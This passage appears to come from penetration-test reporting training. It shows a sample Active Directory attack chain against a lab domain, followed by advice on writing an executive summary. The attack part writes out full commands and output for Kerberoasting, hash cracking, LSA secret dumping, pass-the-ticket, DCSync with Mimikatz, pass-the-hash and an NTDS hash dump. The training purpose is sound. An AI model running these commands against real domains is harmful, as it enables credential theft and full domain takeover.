<pre><code class="lang-shell-session">[!bash!]$ sudo bloodhound-python -u <span class="hljs-string">'bsmith'</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">'&lt;REDACTED&gt;'</span> -d inlanefreight<span class="hljs-selector-class">.local</span> -ns <span class="hljs-number">192.168</span>.<span class="hljs-number">195.204</span> -c All

INFO: Found AD domain: inlanefreight<span class="hljs-selector-class">.local</span>
INFO: Connecting to LDAP server: DC01<span class="hljs-selector-class">.INLANEFREIGHT</span><span class="hljs-selector-class">.LOCAL</span>
INFO: Found <span class="hljs-number">1</span> domains
INFO: Found <span class="hljs-number">1</span> domains <span class="hljs-keyword">in</span> the forest
INFO: Found <span class="hljs-number">503</span> computers
INFO: Connecting to LDAP server: DC01<span class="hljs-selector-class">.INLANEFREIGHT</span><span class="hljs-selector-class">.LOCAL</span>
INFO: Found <span class="hljs-number">652</span> users

&lt;SNIP&gt;
</code></pre>
<p>The tester used this tool to check privileges for each of the SPN accounts enumerated in previous steps and noticed that only the <code>mssqlsvc</code> account had any privileges beyond a standard domain user. This account had local administrator access over the <code>SQL01</code> host. SQL servers are often high-value targets in a domain as they hold privileged credentials, sensitive data, or may even have a more privileged user logged in.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/bh\_mssqlsvc.png" alt="image"></p>
<p>The tester then performed a targeted Kerberoasting attack to retrieve the Kerberos TGS ticket for the <code>mssqlsvc</code> service account.</p>
<p><strong>GetUserSPNs</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ GetUserSPNs.py INLANEFREIGHT.<span class="hljs-keyword">LOCAL</span>/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - <span class="hljs-keyword">Copyright</span> 2021 SecureAuth Corporation

Password:
ServicePrincipalName                     Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------------  --------  --------  --------------------------  ---------  ----------
MSSQLSvc/SQL01.inlanefreight.<span class="hljs-keyword">local</span>:1433  mssqlsvc            2022-05-13 16:52:07.280623  &lt;never&gt;               


<span class="hljs-variable">$krb5tgs</span><span class="hljs-variable">$23</span>$*mssqlsvc<span class="hljs-variable">$INLANEFREIGHT</span>.<span class="hljs-keyword">LOCAL</span><span class="hljs-variable">$INLANEFREIGHT</span>.<span class="hljs-keyword">LOCAL</span>/mssqlsvc*<span class="hljs-variable">$2c43cf68f965432014279555d1984740</span><span class="hljs-variable">$5a3988485926feab23d73ad500b2f9b7698d46e91f9790348dec2867e5b1733cd5df326f346a6a3450dbd6c122f0aa72b9feca4ba8318463c782936c51da7fa62d5106d795b4ff0473824cf5f85101fd603d0ea71edb11b8e9780e68c2ce096739fff62dbf86a67b53a616b7f17fb3c164d8db0a7dc0c60ad48fb21aacfeecf36f2e17ca4e339ead4a8987be84486460bf41368426ef754930cfd4b92fee996e2f2f35796c44ba798c2a0f4184c9dc946a5009a515b2469d0e81f8b45360ba96f8f8fadb4678877d6c88b21e54804068bfbdb5c3ac393c5efcdf68286ed31bfa25f8ece180f1e3aaa4388886ed629595a6b95c68fc843c015669d57e950116c7b3988400d850e415059023e1cd27a2d6a897185716b806eba383bc5a0715884103212f2cc6e680a5409324b25440a015256fcce0be87a4ed348152b8d4b7e571c40ccb9c295c8cf18e</span> &lt;SNIP&gt;
</code></pre>
<p>The tester was successful in &quot;cracking&quot; this password offline to reveal its cleartext value.</p>
<p><strong>Hashcat</strong></p>
<pre><code class="lang-shell-session">[!bash!]<span class="hljs-variable">$ </span><span class="hljs-variable">$hashcat</span> -m <span class="hljs-number">13100</span> mssqlsvc_tgs /usr/share/wordlists/rockyou.txt 

hashcat (v6.<span class="hljs-number">1.1</span>) starting...

&lt;SNIP&gt;

<span class="hljs-variable">$krb5tgs</span><span class="hljs-variable">$23</span><span class="hljs-variable">$*</span>mssqlsvc<span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL<span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL/mssqlsvc*<span class="hljs-variable">$2c43cf68f965432014279555d1984740</span><span class="hljs-variable">$5a</span>&lt;SNIP&gt;<span class="hljs-symbol">:&lt;REDACTED&gt;</span>
</code></pre>
<p>This password could be used to access the <code>SQL01</code> host remotely and retrieve a set of cleartext credentials from the registry for the <code>srvadmin</code> account.</p>
<p><strong>CrackMapExec</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ crackmapexec smb <span class="hljs-number">192.168</span><span class="hljs-meta">.195</span><span class="hljs-meta">.220</span> -u mssqlsvc -p &lt;REDACTED&gt; --lsa

SMB         <span class="hljs-number">192.168</span><span class="hljs-meta">.195</span><span class="hljs-meta">.220</span> <span class="hljs-number">445</span>    SQL01            [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         <span class="hljs-number">192.168</span><span class="hljs-meta">.195</span><span class="hljs-meta">.220</span> <span class="hljs-number">445</span>    SQL01            [+] INLANEFREIGHT.LOCAL\mssqlsvc:&lt;REDACTED&gt; 
SMB         <span class="hljs-number">192.168</span><span class="hljs-meta">.195</span><span class="hljs-meta">.220</span> <span class="hljs-number">445</span>    SQL01            [+] Dumping LSA secrets
SMB         <span class="hljs-number">192.168</span><span class="hljs-meta">.195</span><span class="hljs-meta">.220</span> <span class="hljs-number">445</span>    SQL01            INLANEFREIGHT.LOCAL/Administrator:$DCC2<span class="hljs-number">$10240</span>#Administrator#7bd0f186CCCCC450c5e8cb53228cc0
SMB         <span class="hljs-number">192.168</span><span class="hljs-meta">.195</span><span class="hljs-meta">.220</span> <span class="hljs-number">445</span>    SQL01            INLANEFREIGHT.LOCAL/srvadmin:$DCC2<span class="hljs-number">$10240</span>#srvadmin#ef393703f3fabCCCCCa547caffff5f

&lt;SNIP&gt;

SMB         <span class="hljs-number">192.168</span><span class="hljs-meta">.195</span><span class="hljs-meta">.220</span> <span class="hljs-number">445</span>    SQL01            INLANEFREIGHT\srvadmin:&lt;REDACTED&gt;

&lt;SNIP&gt;

SMB         <span class="hljs-number">192.168</span><span class="hljs-meta">.195</span><span class="hljs-meta">.220</span> <span class="hljs-number">445</span>    SQL01            [+] Dumped <span class="hljs-number">10</span> LSA secrets to /home/mrb3n/.cme/logs/SQL01_192<span class="hljs-meta">.168</span><span class="hljs-meta">.195</span><span class="hljs-meta">.220_2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">14_081528.</span>secrets <span class="hljs-keyword">and</span> /home/mrb3n/.cme/logs/SQL01_192<span class="hljs-meta">.168</span><span class="hljs-meta">.195</span><span class="hljs-meta">.220_2022</span>-<span class="hljs-number">05</span>-<span class="hljs-number">14_081528.</span>cached
</code></pre>
<p>Using these credentials, the tester logged into the <code>MS01</code> host via Remote Desktop (RDP) and noted that another user, <code>pramirez</code>, was also currently logged in.</p>
<p><strong>Logged In Users</strong></p>
<pre><code class="lang-cmd-session">C:\htb&gt; query <span class="hljs-keyword">user</span>

 <span class="hljs-title">USERNAME</span>              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 pramirez              rdp-tcp<span class="hljs-comment">#1           2  Active          3  5/14/2022 8:21 AM</span>
&gt;srvadmin              rdp-tcp<span class="hljs-comment">#2           3  Active          .  5/14/2022 8:24 AM</span>
</code></pre>
<p>The tester checked the BloodHound tool and noticed that this user could perform the DCSync attack, a technique for stealing the Active Directory password database by leveraging a protocol used by domain controllers to replicate domain data. This attack can be used to retrieve NTLM password hashes for any user in the domain.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/162/bh\_pramirez.png" alt="image"></p>
<p>After connecting, the tester used the Rubeus tool to view all Kerberos tickets currently available on the system and noticed that tickets for the <code>pramirez</code> user were present.</p>
<p><strong>Rubeus</strong></p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; .\Rubeus.exe triage

   ______        _
  (_____ \      |<span class="hljs-string"> </span>|
   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

  v2.0.2


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x256aef

 ------------------------------------------------------------------------------------------------------------------------
 </span>|<span class="hljs-string"> LUID     </span>|<span class="hljs-string"> UserName                       </span>|<span class="hljs-string"> Service                                           </span>|<span class="hljs-string"> EndTime              </span>|
 ------------------------------------------------------------------------------------------------------------------------
 |<span class="hljs-string"> 0x256aef </span>|<span class="hljs-string"> srvadmin @ INLANEFREIGHT.LOCAL </span>|<span class="hljs-string"> krbtgt/INLANEFREIGHT.LOCAL                        </span>|<span class="hljs-string"> 5/14/2022 6:24:19 PM </span>|
 |<span class="hljs-string"> 0x256aef </span>|<span class="hljs-string"> srvadmin @ INLANEFREIGHT.LOCAL </span>|<span class="hljs-string"> LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL </span>|<span class="hljs-string"> 5/14/2022 6:24:19 PM </span>|
 |<span class="hljs-string"> 0x1a8b19 </span>|<span class="hljs-string"> pramirez @ INLANEFREIGHT.LOCAL </span>|<span class="hljs-string"> krbtgt/INLANEFREIGHT.LOCAL                        </span>|<span class="hljs-string"> 5/14/2022 6:21:35 PM </span>|
 |<span class="hljs-string"> 0x1a8b19 </span>|<span class="hljs-string"> pramirez @ INLANEFREIGHT.LOCAL </span>|<span class="hljs-string"> ProtectedStorage/DC01.INLANEFREIGHT.LOCAL         </span>|<span class="hljs-string"> 5/14/2022 6:21:35 PM </span>|
 |<span class="hljs-string"> 0x1a8b19 </span>|<span class="hljs-string"> pramirez @ INLANEFREIGHT.LOCAL </span>|<span class="hljs-string"> cifs/DC01.INLANEFREIGHT.LOCAL                     </span>|<span class="hljs-string"> 5/14/2022 6:21:35 PM </span>|
 |<span class="hljs-string"> 0x1a8b19 </span>|<span class="hljs-string"> pramirez @ INLANEFREIGHT.LOCAL </span>|<span class="hljs-string"> cifs/DC01                                         </span>|<span class="hljs-string"> 5/14/2022 6:21:35 PM </span>|
 |<span class="hljs-string"> 0x1a8b19 </span>|<span class="hljs-string"> pramirez @ INLANEFREIGHT.LOCAL </span>|<span class="hljs-string"> LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL </span>|<span class="hljs-string"> 5/14/2022 6:21:35 PM </span>|
 |<span class="hljs-string"> 0x1a8ade </span>|<span class="hljs-string"> pramirez @ INLANEFREIGHT.LOCAL </span>|<span class="hljs-string"> krbtgt/INLANEFREIGHT.LOCAL                        </span>|<span class="hljs-string"> 5/14/2022 6:21:35 PM </span>|
 |<span class="hljs-string"> 0x1a8ade </span>|<span class="hljs-string"> pramirez @ INLANEFREIGHT.LOCAL </span>|<span class="hljs-string"> LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL </span>|<span class="hljs-string"> 5/14/2022 6:21:35 PM</span>
</code></pre>
<p>The tester then used this tool to retrieve the Kerberos TGT ticket for this user, which can then be used to perform a &quot;pass-the-ticket&quot; attack and use the stolen TGT ticket to access resources in the domain.</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; .\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt

   ______        _
  (_____ \      |<span class="hljs-string"> </span>|
   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

  v2.0.2


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x1a8b19
[*] Current LUID    : 0x256aef

  UserName                 : pramirez
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x1a8b19
  UserSID                  : S-1-5-21-1666128402-2659679066-1433032234-1108
  AuthenticationPackage    : Negotiate
  LogonType                : RemoteInteractive
  LogonTime                : 5/14/2022 8:21:35 AM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.LOCAL
  UserPrincipalName        : pramirez@INLANEFREIGHT.LOCAL


    ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
    ServiceRealm             :  INLANEFREIGHT.LOCAL
    UserName                 :  pramirez
    UserRealm                :  INLANEFREIGHT.LOCAL
    StartTime                :  5/15/2022 3:51:35 AM
    EndTime                  :  5/15/2022 1:51:35 PM
    RenewTill                :  5/21/2022 8:21:35 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  3g/++VoJZ4ipbExARBCKK960cN+3juTKNHiQ8XpHL/k=
    Base64EncodedTicket   :

      doIFZDCCBWCgAwIBBaEDAgEWooIEVDCCBFBhgg&lt;SNIP&gt;

   ______        _
  (_____ \      </span>|<span class="hljs-string"> </span>|
   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___
  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)
  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|
  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/

  v2.0.2


[*] Action: Import Ticket
[+] Ticket successfully imported!</span>
</code></pre>
<p>The user performed the pass-the-ticket attack and successfully authenticated as the <code>pramirez</code> user.</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; .\Rubeus.<span class="hljs-keyword">exe</span> ptt /ticke<span class="hljs-variable">t:doIFZDCCBWCgAwIBBaEDAgEWo</span><span class="hljs-symbol">&lt;SNIP&gt;</span>
</code></pre>
<p>This was confirmed using the <code>klist</code> command to view cached Kerberos tickets in the current session.</p>
<p><strong>Cached Kerberos Tickets</strong></p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">klist</span>

<span class="hljs-selector-tag">Current</span> <span class="hljs-selector-tag">LogonId</span> <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">0</span><span class="hljs-selector-pseudo">:0x256d1d</span>

<span class="hljs-selector-tag">Cached</span> <span class="hljs-selector-tag">Tickets</span>: (<span class="hljs-number">1</span>)

<span class="hljs-selector-id">#0</span>&gt;     <span class="hljs-selector-tag">Client</span>: <span class="hljs-selector-tag">pramirez</span> @ <span class="hljs-selector-tag">INLANEFREIGHT</span><span class="hljs-selector-class">.LOCAL</span>
        <span class="hljs-selector-tag">Server</span>: <span class="hljs-selector-tag">krbtgt</span>/<span class="hljs-selector-tag">INLANEFREIGHT</span><span class="hljs-selector-class">.LOCAL</span> @ <span class="hljs-selector-tag">INLANEFREIGHT</span><span class="hljs-selector-class">.LOCAL</span>
        <span class="hljs-selector-tag">KerbTicket</span> <span class="hljs-selector-tag">Encryption</span> <span class="hljs-selector-tag">Type</span>: <span class="hljs-selector-tag">AES-256-CTS-HMAC-SHA1-96</span>
        <span class="hljs-selector-tag">Ticket</span> <span class="hljs-selector-tag">Flags</span> <span class="hljs-selector-tag">0x40e10000</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">forwardable</span> <span class="hljs-selector-tag">renewable</span> <span class="hljs-selector-tag">initial</span> <span class="hljs-selector-tag">pre_authent</span> <span class="hljs-selector-tag">name_canonicalize</span>
        <span class="hljs-selector-tag">Start</span> <span class="hljs-selector-tag">Time</span>: <span class="hljs-selector-tag">5</span>/<span class="hljs-selector-tag">15</span>/<span class="hljs-selector-tag">2022</span> <span class="hljs-selector-tag">3</span><span class="hljs-selector-pseudo">:51</span><span class="hljs-selector-pseudo">:35</span> (local)
        <span class="hljs-selector-tag">End</span> <span class="hljs-selector-tag">Time</span>:   <span class="hljs-selector-tag">5</span>/<span class="hljs-selector-tag">15</span>/<span class="hljs-selector-tag">2022</span> <span class="hljs-selector-tag">13</span><span class="hljs-selector-pseudo">:51</span><span class="hljs-selector-pseudo">:35</span> (local)
        <span class="hljs-selector-tag">Renew</span> <span class="hljs-selector-tag">Time</span>: <span class="hljs-selector-tag">5</span>/<span class="hljs-selector-tag">21</span>/<span class="hljs-selector-tag">2022</span> <span class="hljs-selector-tag">8</span><span class="hljs-selector-pseudo">:21</span><span class="hljs-selector-pseudo">:35</span> (local)
        <span class="hljs-selector-tag">Session</span> <span class="hljs-selector-tag">Key</span> <span class="hljs-selector-tag">Type</span>: <span class="hljs-selector-tag">AES-256-CTS-HMAC-SHA1-96</span>
        <span class="hljs-selector-tag">Cache</span> <span class="hljs-selector-tag">Flags</span>: <span class="hljs-selector-tag">0x1</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">PRIMARY</span>
        <span class="hljs-selector-tag">Kdc</span> <span class="hljs-selector-tag">Called</span>:
</code></pre>
<p>The tester then utilized this access to perform a DCSync attack and retrieve the NTLM password hash for the built-in Administrator account, which led to Enterprise Admin level access over the domain.</p>
<p><strong>Mimikatz</strong></p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; .\mimikatz.<span class="hljs-keyword">exe</span>

  .#####.   mimikatz <span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (x64) #<span class="hljs-number">19041</span> Aug <span class="hljs-number">10</span> <span class="hljs-number">2021</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">53</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.<span class="hljs-keyword">com</span> )
 ## \ / ##       &gt; http<span class="hljs-variable">s:</span>//blog.gentilkiwi.<span class="hljs-keyword">com</span>/mimikatz
 <span class="hljs-string">'## v ##'</span>       Vincent LE TOUX             ( vincent.letoux@gmail.<span class="hljs-keyword">com</span> )
  <span class="hljs-string">'#####'</span>        &gt; http<span class="hljs-variable">s:</span>//pingcastle.<span class="hljs-keyword">com</span> / http<span class="hljs-variable">s:</span>//mysmartlogon.<span class="hljs-keyword">com</span> ***/

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator
[DC] <span class="hljs-string">'INLANEFREIGHT.LOCAL'</span> will <span class="hljs-keyword">be</span> the domain
[DC] <span class="hljs-string">'DC01.INLANEFREIGHT.LOCAL'</span> will <span class="hljs-keyword">be</span> the DC server
[DC] <span class="hljs-string">'INLANEFREIGHT\administrator'</span> will <span class="hljs-keyword">be</span> the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (<span class="hljs-number">9</span>)
[DC] ms-DS-ReplicationEpoch i<span class="hljs-variable">s:</span> <span class="hljs-number">1</span>

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : <span class="hljs-number">30000000</span> ( USER_OBJECT )
User Account Control : <span class="hljs-number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password <span class="hljs-keyword">last</span> <span class="hljs-keyword">change</span> : <span class="hljs-number">2</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">32</span>:<span class="hljs-number">55</span> PM
Object Security ID   : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1666128402</span>-<span class="hljs-number">2659679066</span>-<span class="hljs-number">1433032234</span>-<span class="hljs-number">500</span>
Object Relative ID   : <span class="hljs-number">500</span>

Credential<span class="hljs-variable">s:</span>
  Hash NTLM: e4axxxxxxxxxxxxxxxx1c88c2e94cba2
</code></pre>
<p>The tester confirmed this access by authenticating to a Domain Controller in the <code>INLANEFREIGHT.LOCAL</code> domain.</p>
<p><strong>CrackMapExec</strong></p>
<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ sudo crackmapexec smb <span class="hljs-number">192.168</span>.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2

SMB         <span class="hljs-number">192.168</span>.195.204 <span class="hljs-number">445</span>    DC01             [<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> (<span class="hljs-name">name:DC01</span>) (<span class="hljs-name">domain:INLANEFREIGHT.LOCAL</span>) (<span class="hljs-name">signing:True</span>) (<span class="hljs-name">SMBv1:False</span>)
SMB         <span class="hljs-number">192.168</span>.195.204 <span class="hljs-number">445</span>    DC01             [<span class="hljs-name"><span class="hljs-builtin-name">+</span></span>] INLANEFREIGHT.LOCAL\administrator e4axxxxxxxxxxxxxxxx1c88c2e94cba2
</code></pre>
<p>With this access, it was possible to retrieve the NTLM password hashes for all users in the domain. The tester then performed offline cracking of these hashes using the Hashcat tool. A domain password analysis showing several metrics can be found in the appendices of this report.</p>
<p><strong>Dumping NTDS with SecretsDump</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ secretsdump.py inlanefreight/administrator@<span class="hljs-number">192.168</span><span class="hljs-number">.195</span><span class="hljs-number">.204</span> -hashes <span class="hljs-string">ad3b435b51404eeaad3b435b51404ee:</span>e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm

Impacket v0<span class="hljs-number">.9</span><span class="hljs-number">.24</span>.dev1+<span class="hljs-number">20210922.102044</span>.c7bc76f8 - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation

[*] Dumping Domain Credentials (domain\<span class="hljs-string">uid:</span><span class="hljs-string">rid:</span><span class="hljs-string">lmhash:</span>nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
<span class="hljs-string">Administrator:</span><span class="hljs-number">500</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-string">e4axxxxxxxxxxxxxxxx1c88c2e94cba2:</span>::
<span class="hljs-string">Guest:</span><span class="hljs-number">501</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">31</span><span class="hljs-string">d6cxxxxxxxxxx7e0c089c0:</span>::
<span class="hljs-string">krbtgt:</span><span class="hljs-number">502</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">4180</span><span class="hljs-string">f1f4xxxxxxxxxx0e8523771a8c:</span>::
<span class="hljs-string">mssqlsvc:</span><span class="hljs-number">1106</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">55</span><span class="hljs-string">a6c7xxxxxxxxxxxx2b07e1:</span>::
<span class="hljs-string">srvadmin:</span><span class="hljs-number">1107</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-number">9</span><span class="hljs-string">f9154fxxxxxxxxxxxxx0930c0:</span>::
<span class="hljs-string">pramirez:</span><span class="hljs-number">1108</span>:<span class="hljs-string">aad3b435b51404eeaad3b435b51404ee:</span><span class="hljs-string">cf3a5525ee9xxxxxxxxxxxxxed5c58:</span>::

&lt;SNIP&gt;
</code></pre>
<hr>
<h3 id="writing-a-strong-executive-summary">Writing a Strong Executive Summary</h3>
<p>The <code>Executive Summary</code> is one of the most important parts of the report. As mentioned previously, our clients are ultimately paying for the report deliverable which has several purposes aside from showing weaknesses and reproduction steps that can be used by technical teams working on remediation. The report will likely be viewed in some part by other internal stakeholders such as Internal Audit, IT and IT Security management, C-level management, and even the Board of Directors. The report may be used to either validate funding from the prior year for infosec or to request additional funding for the following year. For this reason, we need to ensure that there is content in the report that can be easily understood by people without technical knowledge.</p>
<p><strong>Key Concepts</strong></p>
<p>The intended audience for the <code>Executive Summary</code> is typically the person that is going to be responsible for allocating the budget to fixing the issues we discovered. For better or worse, some of our clients have likely been trying to get funding to fix the issues presented in the report for years and fully intend to use the report as ammunition to finally get some stuff done. This is our best chance to help them out. If we lose our audience here and there are budgetary limitations, the rest of the report can quickly become worthless. Some key things to assume (that may or may not be true) to maximize the effectiveness of the <code>Executive Summary</code> are:</p>
<ul>
<li>It should be obvious, but this should be written for someone who isn&#39;t technical at all. The typical barometer for this is &quot;if your parents can&#39;t understand what the point is, then you need to try again&quot; (assuming your parents aren&#39;t CISOs or sysadmins or something of the sort).</li>
<li>The reader doesn&#39;t do this every day. They don&#39;t know what Rubeus does, what password spraying means, or how it&#39;s possible that tickets can grant different tickets (or likely even what a ticket is, aside from a piece of paper to enter a concert or a ballgame).</li>
<li>This may be the first time they&#39;ve ever been through a penetration test.</li>
<li>Much like the rest of the world in the instant gratification age, their attention span is small. When we lose it, we are extraordinarily unlikely to get it back.</li>
<li>Along the same lines, no one likes to read something where they have to Google what things mean. Those are called distractions.</li>
</ul>
<p>Let&#39;s talk through a list of &quot;do&#39;s and don&#39;ts&quot; when writing an effective <code>Executive Summary</code>.</p>
<p><strong>Do</strong></p>
<ul>
<li><code>When talking about metrics, be as specific as possible.</code> - Words like &quot;several,&quot; &quot;multiple,&quot; and &quot;few&quot; are ambiguous and could mean 6 or 500. Executives aren&#39;t going to dig through the report for this information, so if you&#39;re going to talk about this, let them know what you&#39;ve got; otherwise, you&#39;re going to lose their attention. The most common reason people do not commit to a specific number is to leave it open in case the consultant missed one. You can make minor changes to the language to account for this, such as &quot;while there may be additional instances of X, in the time allotted to the assessment, we observed 25 occurrences of X&quot;.</li>
<li><code>It&#39;s a summary. Keep it that way.</code> - If you wrote more than 1.5-2 pages, you&#39;ve probably been too verbose. Examine the topics you talked about and determine whether they can be collapsed into higher-level categories that might fall into specific policies or procedures.</li>
<li><code>Describe the types of things you managed to access</code> - Your audience may not have any idea what &quot;Domain Admin&quot; means, but if you mention that you gained access to an account that enabled you to get your hands on HR documents, banking systems, and other critical assets, that&#39;s universally understandable.</li>
<li><code>Describe the general things that need to improve to mitigate the risks you discovered.</code> - This should not be &quot;install 3 patches and call me in a year&quot;. You should be thinking in terms of &quot;what process broke down that enabled a five-year-old vulnerability to go unpatched in a quarter of the environment?&quot;. If you password spray and get 500 hits on Welcome1!, changing the passwords of those 500 accounts is only part of the solution. The other part is probably providing the Help Desk with a way to set stronger initial passwords efficiently.</li>
<li><code>If you&#39;re feeling brave and have a decent amount of experience on both sides, provide a general expectation for how much effort will be necessary to fix some of this.</code> - If you have a long past as a sysadmin or engineer and you know how much internal politics people may have to wade through to start manipulating group policies, you may want to try and set an expectation for low, moderate, and significant levels of time and effort to correct the issues, so an overzealous CEO doesn&#39;t go tell his server team they need to apply CIS hardening templates to their GPOs over the weekend without testing them first.</li>
</ul>
<p><strong>Do Not</strong></p>
<ul>
<li><code>Name or recommend specific vendors.</code> - The deliverable is a technical document, not a sales document. It&#39;s acceptable to suggest technologies such as EDR or log aggregation but stay away from recommending specific vendors of those technologies, like CrowdStrike and Splunk. If you have experience with a particular vendor that is recent and you feel comfortable giving the client that feedback, do so out-of-band and make sure that you&#39;re clear that they should make their own decision (and probably bring the client&#39;s account executive into that discussion). If you&#39;re describing specific vulnerabilities, your reader is more likely to recognize something like &quot;vendors like VMWare, Apache, and Adobe&quot; instead of &quot;vSphere, Tomcat, and Acrobat.&quot;</li>
<li><code>Use Acronyms.</code> - IP and VPN have reached a level of ubiquity that they&#39;re maybe okay, but using acronyms for protocols and types of attacks (e.g., SNMP, MitM) is tone-deaf and will render your executive summary completely ineffective for its intended audience.</li>
<li><code>Spend more time talking about stuff that doesn&#39;t matter than you do about the significant findings in the report.</code> - It is within your power to steer attention. Don&#39;t waste it on the issues you discovered that weren&#39;t that impactful.</li>
